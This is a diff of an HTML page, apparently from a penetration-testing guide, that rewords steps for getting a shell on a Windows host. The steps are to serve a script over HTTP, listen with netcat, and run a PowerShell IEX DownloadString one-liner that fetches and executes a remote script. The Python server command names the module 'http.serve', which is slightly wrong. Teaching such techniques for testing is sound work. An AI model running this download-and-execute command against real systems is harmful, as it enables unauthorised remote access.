@@ -576,10 +576,10 @@ You need to add the following line at the end:</p>
 
 <p>On your local machine:</p>
 <ul>
-<li>You create an HTTP server to serve the script: <code>python -m http.serve</code></li>
-<li>You listen for an incoming <a href="../reverse-shell/">connection with nc</a>.</li>
+<li>Create an HTTP server to serve the script: <code>python -m http.serve</code></li>
+<li>Listen for an incoming <a href="../reverse-shell/#listen-with-netcat">connection with nc</a>.</li>
 </ul>
-<p>And on the remote host, you execute the following PowerShell script:</p>
+<p>On the remote host, execute the following PowerShell script:</p>
 <pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
             
